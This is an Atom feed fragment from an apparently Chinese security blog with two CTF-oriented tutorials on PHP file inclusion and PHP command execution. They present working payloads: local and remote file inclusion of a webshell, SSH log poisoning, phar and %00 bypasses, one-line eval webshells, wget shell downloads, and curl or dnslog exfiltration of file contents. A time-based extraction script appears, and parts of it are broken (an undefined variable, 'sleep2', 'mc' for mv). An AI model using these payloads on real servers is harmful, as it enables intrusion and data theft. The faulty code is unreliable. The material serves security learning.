    <category term="网络安全" scheme="http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP文件包含漏洞基础</title>
    <link href="http://h3geeker.top/posts/f4224d8e.html"/>
    <id>http://h3geeker.top/posts/f4224d8e.html</id>
    <published>2021-11-10T13:35:22.000Z</published>
    <updated>2021-11-11T03:48:24.163Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、文件包含漏洞"><a href="#一、文件包含漏洞" class="headerlink" title="一、文件包含漏洞"></a>一、文件包含漏洞</h1><p>文件包含主要是为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。</p><h1 id="二、漏洞产生原因"><a href="#二、漏洞产生原因" class="headerlink" title="二、漏洞产生原因"></a>二、漏洞产生原因</h1><p>服务器在执行PHP文件的时候，用户可控文件的参数，并且没有严格的检验和过滤，或者被Bypass，操作一些敏感文件来导致文件泄露和恶意代码注入等危害</p><p>举一个简单的例子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>filename</code>参数没有经过过滤，直接赋值给<code>include()</code>函数，我们就可以修改<code>filenname</code>的值，执行其他操作</p><p>我们在同目录下创建一个<code>info.txt</code></p><p>内容如下</p><p><img src="https://i.loli.net/2021/09/29/KGvSAi4Ha9VIeR5.png"></p><p>这样我们只需要把<code>info.txt</code>包含进去即可解析</p><p><img src="https://i.loli.net/2021/09/29/f41k8sFO7qRdTGB.png"></p><h1 id="三、PHP常用的包含函数"><a href="#三、PHP常用的包含函数" class="headerlink" title="三、PHP常用的包含函数"></a>三、PHP常用的包含函数</h1><p>在php中，常用的为以下4个函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>include</code>和<code>require</code>的区别主要是<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p><img src="https://i.loli.net/2021/09/29/OSYPlCQxfTcrn29.png"></p><p><code>include_once</code>，<code>require_once</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><p><img src="https://i.loli.net/2021/09/29/8GWct7SjCYgzXx4.png"></p><h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><p>文件包含利用有两种</p><pre class="line-numbers language-none"><code class="language-none">1.包含本地服务器的文件2.包含其他服务器的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而且，包含的时候，不一定要包含php文件</p><p>只要文件中有一块完整的php代码即可</p><p>例如<code>a.txt</code></p><p>内容为</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也是可以的</p><h2 id="1-包含本地服务器的文件"><a href="#1-包含本地服务器的文件" class="headerlink" title="1.包含本地服务器的文件"></a>1.包含本地服务器的文件</h2><p>举一个例子，利用CTFSHOW的靶机</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里没有做任何限制，我们可以读取任意文件（罗列一些常用的，其他的师傅们可以自行收集）</p><pre class="line-numbers language-none"><code class="language-none">/etc/apache2/*#Apache配置文件，可以获知Web目录、服务端口等信息/etc/nginx/*#Nginx配置文件，可以获知Web目录、服务端口等信息/etc/crontab#定时任务文件/etc/environment#环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况/etc/hostname#主机名/etc/hosts#主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP/域名/etc/issue#系统版本信息/etc/mysql/*#MYSQL配置文件/etc/php/*#PHP配置文件/proc 目录#/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self代替/proc/[pid]即可/proc/[pid]/cmdline#cmdline可读出比较敏感的信息# ssh日志，攻击方法：ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1/var/log/auth.log# apache日志/var/log/apache2/[access.log|error.log]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><a href="https://www.anquanke.com/post/id/231407">https://www.anquanke.com/post/id/231407</a></p></blockquote><p>这里可以读取任意文件，我们可以试着读<code>/etc/passwd</code></p><p><img src="https://i.loli.net/2021/09/29/BKbZx2hzpq18kvI.png"></p><h2 id="2-包含远程服务器的文件"><a href="#2-包含远程服务器的文件" class="headerlink" title="2.包含远程服务器的文件"></a>2.包含远程服务器的文件</h2><p>这里需要前提</p><pre class="line-numbers language-none"><code class="language-none">allow_url_fopen = On 是否允许打开远程文件allow_url_include = On 是否允许include/require远程文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里可以本地测试一下，利用虚拟机做远程服务器</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里存在文件包含漏洞</p><p><img src="https://i.loli.net/2021/09/29/ipOaUYZBuwmlzdT.png"></p><p>“服务器”上存在webshell</p><p>传参：</p><pre class="line-numbers language-none"><code class="language-none">http://localhost/include.php?page=http://192.168.179.129/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/09/29/HZT1fJxPSLtVd6m.png"></p><p>可以看到成功包含到了webshell</p><h2 id="3-限制后缀名"><a href="#3-限制后缀名" class="headerlink" title="3.限制后缀名"></a>3.限制后缀名</h2><p>例子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span> <span class="token double-quoted-string string">".H3h3QAQ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，在进行包含文件的时候文件名后缀进行了拼接，强制后缀为<code>H3h3QAQ</code></p><p>所以我们需要Bypass</p><h3 id="1-00截断"><a href="#1-00截断" class="headerlink" title="(1).%00截断"></a>(1).%00截断</h3><p>需要PHP&lt;5.3.4并且magic_quotes_gpc = Off</p><pre class="line-numbers language-none"><code class="language-none">/include.php?page=info.txt%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-长度截断"><a href="#2-长度截断" class="headerlink" title="(2).长度截断"></a>(2).长度截断</h3><p>PHP版本&lt;=5.2.?</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃掉<br>Linux下目录最大长度为4096字节，超出的部分会被丢弃掉</p></blockquote><p>构造payload的时候超出限制即可</p><p>类似于</p><pre class="line-numbers language-none"><code class="language-none">/include.php?page=info.txt....................*n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="(3).伪协议"></a>(3).伪协议</h3><pre class="line-numbers language-none"><code class="language-none">zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码）phar://文件路径/phar文件名称/phar内的文件名称phar://协议与zip://类似，同样可以访问zip格式压缩包内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>多配合在上传题使用</p><p>若发现只有jpg、png才可以上传文件</p><p>则可以利用phar伪协议</p><p>写一个shell 将后缀名改成.php 再将其压缩，再改成*.jpg、*.png 此时可以上传<br>提示成功后，利用菜刀添加/include.php?file=phar*://***/a.png/a即可</p><pre class="line-numbers language-none"><code class="language-none">?file=zip://D:\zip.jpg%23phpinfo?file=phar://zip.zip/phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-限制前缀"><a href="#4-限制前缀" class="headerlink" title="4.限制前缀"></a>4.限制前缀</h2><p>例如<code>../</code>被过滤</p><p>可以利用url编码</p><pre class="line-numbers language-none"><code class="language-none">../%2e%2e%2f..%2f%2e%2e/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或者二次编码</p><pre class="line-numbers language-none"><code class="language-none">../%252e%252e%252f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="5-PHP伪协议"><a href="#5-PHP伪协议" class="headerlink" title="5.PHP伪协议"></a>5.PHP伪协议</h2><h3 id="1-file-协议"><a href="#1-file-协议" class="headerlink" title="(1).file:// 协议"></a>(1).file:// 协议</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p><pre class="line-numbers language-none"><code class="language-none">POC/include.php?file=file://phpinfo.txt/include.php?file=http://127.0.0.1/phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-php-协议"><a href="#2-php-协议" class="headerlink" title="(2).php://协议"></a>(2).php://协议</h3><p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</p><pre class="line-numbers language-none"><code class="language-none">php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th><strong>协议</strong></th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype="multipart/form-data"</code> 的时候<code>php://input </code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><h4 id="1-php-filter"><a href="#1-php-filter" class="headerlink" title="1.php://filter"></a>1.php://filter</h4><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。</p><p>对于php://来说，是支持多种过滤器嵌套的</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/[read|write]=[过滤器1]|[过滤器2]/</span>resource<span class="token operator">=</span>文件名称（包含后缀名）#如果<span class="token operator">|</span>被过滤掉了，可以使用多过滤器<span class="token punctuation">:</span>php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/string.rot13/</span>resource<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/convert.base64-encode/</span>resource<span class="token operator">=</span>文件名称（包含后缀名）嵌套过程的执行流程为从左到右<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其实是可以简写成这样的<code>php://filter/[过滤器]</code> ，php会自己进行识别。</p><p>过滤器列表:</p><table><thead><tr><th>过滤器名称</th><th>说明</th><th>类别</th><th>版本</th></tr></thead><tbody><tr><td>string.rot13</td><td>rot13转换</td><td>字符串过滤器</td><td>PHP&gt;4.3.0</td></tr><tr><td>string.toupper、string.tolower</td><td>大小写互转</td><td>字符串过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.base64-encode、convert.base64-decode</td><td>base64编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.quoted-printable-encode、convert.quoted-printable-decode</td><td>URL编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.iconv.编码1.编码2</td><td>任意编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>zlib.deflate、zlib.inflate</td><td>zlib压缩</td><td>压缩过滤器</td><td>PHP&gt;5.1.0</td></tr><tr><td>bzip2.compress、bzip2.decompress</td><td>zlib压缩</td><td>压缩过滤器</td><td>PHP&gt;5.1.0</td></tr></tbody></table><h2 id="6-PHP伪协议常用函数"><a href="#6-PHP伪协议常用函数" class="headerlink" title="6.PHP伪协议常用函数"></a>6.PHP伪协议常用函数</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><blockquote><p><a href="https://blog.csdn.net/qq_42181428/article/details/87090539">https://blog.csdn.net/qq_42181428/article/details/87090539</a></p><p><a href="https://blog.csdn.net/bmth666/article/details/104616201">https://blog.csdn.net/bmth666/article/details/104616201</a></p><p><a href="https://www.anquanke.com/post/id/231407#h3-6">https://www.anquanke.com/post/id/231407#h3-6</a></p><p><a href="https://www.cnblogs.com/jzking121/p/15144416.html">https://www.cnblogs.com/jzking121/p/15144416.html</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430">https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430</a></p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习" scheme="http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="网络安全" scheme="http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码执行漏洞</title>
    <link href="http://h3geeker.top/posts/12a5c357.html"/>
    <id>http://h3geeker.top/posts/12a5c357.html</id>
    <published>2021-11-10T13:35:22.000Z</published>
    <updated>2021-11-11T03:48:16.317Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="代码命令执行函数"><a href="#代码命令执行函数" class="headerlink" title="代码命令执行函数"></a>代码命令执行函数</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><table><thead><tr><th>函数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>${php代码}</td><td></td><td>${phpinfo};</td></tr><tr><td>mixed eval(string $code)</td><td>把字符串code作为php代码执行</td><td>eval(‘phpinfo();’);</td></tr><tr><td>bool assert(mixed $assertion [, string $description])</td><td>assert()会检查指定的assertion并在结果为FALSE时采取适当的相应。如果assertion是字符串，它将会被assert()当作PHP代码来执行</td><td>assert(‘system(“whoami”)’);</td></tr><tr><td>mixed preg_replace(mixde $patterm,mixed $replacement,mixed $subject [, int $limit =-1 [, int&amp;$count]])</td><td>搜索subject中匹配pattern的部分，以replacement进行替换。当$pattern处存在e修饰符是(5.5.0版本/e修饰符已经被弃用了)，$replacement会被当做php代码执行</td><td>preg_replace(“/test/e”,”system(‘whoami’)”,’test’);</td></tr><tr><td>mixed call_user_func(callable $callback [, mixed $paramenter [, mixed $..]])</td><td>第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。传入<code>call_user_func()</code>的参数不能为引用传递</td><td>call_user_func(‘system’,’whoami’);</td></tr><tr><td>mixed call_user_func_array(callable $callback,arry $param_arr)</td><td>把第一个参数作为回调函数（callback）调用，把参数数组(param_arr)作为回调函数的参数传入</td><td>call_user_func_array(‘system’,array(‘whoami’));</td></tr><tr><td>string creat)function( string $args,string $code)</td><td>在php中使用<code>creat_function()</code>创建一个匿名函数(lambda-style)，如果对参数为进行严格的过滤审查，攻击者可以通过提交特殊字符串给creat_function()从而导致任意代码执行</td><td>creat_function(‘$test’,’};phpinfo();/*’);</td></tr><tr><td>array array_map(callable $callback ,array $array1 [, array $…])</td><td>为数组的每个元素应用回调函数。其返回值为数组，是为array1每个元素应用callback函数之后的数组。callback函数形参的数量和传给array_map()数组数量，两者必须一样。</td><td>array_map(‘system’,array(‘whoami’));</td></tr><tr><td>array array_filter (array $array [, callable $callback [, int $flag=0]])</td><td>依次将array数组中的每个值传递到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保持不变</td><td>array_filter(array(‘whoami’),’system’);</td></tr><tr><td>bool usort( array &amp;$array,callabe $value_compare_func)</td><td>通过用户自定义的比较函数对数组进行排序</td><td>$a=array(‘whoami’,’t’);usort($a,”system”);</td></tr><tr><td>bool uasort(array &amp;$array, callable $value_compare_func)</td><td>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</td><td>$a=array(‘whoami’,’t’);uasort($a,”system”);</td></tr></tbody></table><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><table><thead><tr><th>函数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>string system( string $command [, int &amp;$return_var] )</td><td>command是要执行的命令。如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中，显示输出</td><td>system(‘whoami’);</td></tr><tr><td>void passthru ( string $command [, int &amp;$return_var])</td><td>执行外部程序并且显示原始输出</td><td>passthru(‘whoami’);</td></tr><tr><td>void pcntl_exec(string $path [, arry $args [, array $envs]] )</td><td>path是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本args是一个要传递给程序的参数的字符串数组。该模块不能在非Unix平台（Windows）上运行</td><td>pcntl_exec(“/bin/cat/etc/passwd”,”r”);$read=fread($handle,2096);echo $read;pclose($handle);</td></tr><tr><td>string exec (string $command [, array &amp;$output [, int &amp;$return_bar]])</td><td>执行所指定的命令，并返回结果的最后一行内容，不显示输出</td><td>echo exec(‘whoami’);</td></tr><tr><td>string shell_exec(string $cmd)</td><td>通过shell环境执行命令，并且将完整的输出以字符串的方式返回</td><td>echo shell_exec(‘whoami’);</td></tr><tr><td>resource popen(string $command,string $mode)</td><td>打开一个指向进程的管道，该进程该进程由派生给定的command命令执行而产生。后面的mode，当为’r’，返回的文件指针等于命令的STDOUT，当为’w’，返回的文件指针等于命令的STDIN</td><td>$handle = popen(“bin/cat/etc/passwd”,”r”);$read=fread($handle,2096);echo $read;pclose($handle);</td></tr><tr><td>反引号                                                                                                       echo <code>whoami</code>;(md语法问题)</td><td></td><td></td></tr></tbody></table><h1 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该环境为一个无回显的命令执行</p><p>所以我们需要判断命令是否执行成功</p><p>以下方式可以判断是否成功RCE</p><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><pre class="line-numbers language-none"><code class="language-none">1. 延迟?cmd=sleep 3通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行2.HTTP请求(1).在公网服务器监听端口nc -lvp port(2).向目标服务器发起http请求，执行curl命令?cmd=curl ip:port如果向目标服务器发起htpp请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞3.DNS请求dnslog?cmd=ping 9y8y3k.dnslog.cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><pre class="line-numbers language-none"><code class="language-none">1.使用 &gt;或&gt;&gt;?cmd=cat flag.php &gt; flag.txt2.mv或cp?cmd=mc flag.php flag.txt?cmd=cp flag.php flag.txt3.打包压缩(1).tar打包或tar打包并压缩tar cvf flag.tar flag.phptar zcvf flag.tar.gz flag.php(2).zip压缩zip flag.zip flat.php4.cut and sleepsed指定读取文件的第几行cat flag.php|sed -n '2p'提取每一行的第三个字节cut -b 3 flag文件最后cat flag.php|sed -n '2p'|cut -b 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span><span class="token string">""</span>flag<span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token string">"a%3D`cat flag.php|sed -n '2p'|cut -b {}`;[$a %3D \"{}\"] %26%26 sleep2"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        start_time<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>data<span class="token punctuation">)</span>        spend_time<span class="token operator">=</span>end_time <span class="token operator">-</span>start_time        <span class="token keyword">if</span> spend_time<span class="token operator">&gt;=</span><span class="token number">2</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><h4 id="直接写入"><a href="#直接写入" class="headerlink" title="直接写入"></a>直接写入</h4><pre class="line-numbers language-none"><code class="language-none">?cmd = echo "&lt;?php @eval(\$_POST[h3]);?&gt;"&gt;webshell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="外部下载"><a href="#外部下载" class="headerlink" title="外部下载"></a>外部下载</h4><pre class="line-numbers language-none"><code class="language-none">wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Dnslog"><a href="#Dnslog" class="headerlink" title="Dnslog"></a>Dnslog</h4><p>1.命令执行时要避免空格，空格会导致空格后面的命令执行不到；</p><p>2.将读取的文件命令用反引号``包括起来；</p><p>3.拼劲的域名又长度限制</p><p>用<code>&lt;</code>替换读取文件中的空格，且对输出结果base64编码</p><pre class="line-numbers language-none"><code class="language-none">curl `cat&lt;flag.php|base64`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拼接域名（最终构造结果）</p><pre class="line-numbers language-none"><code class="language-none">curl `cat&lt;flag.php|base64`.<span aria-hidden="true" 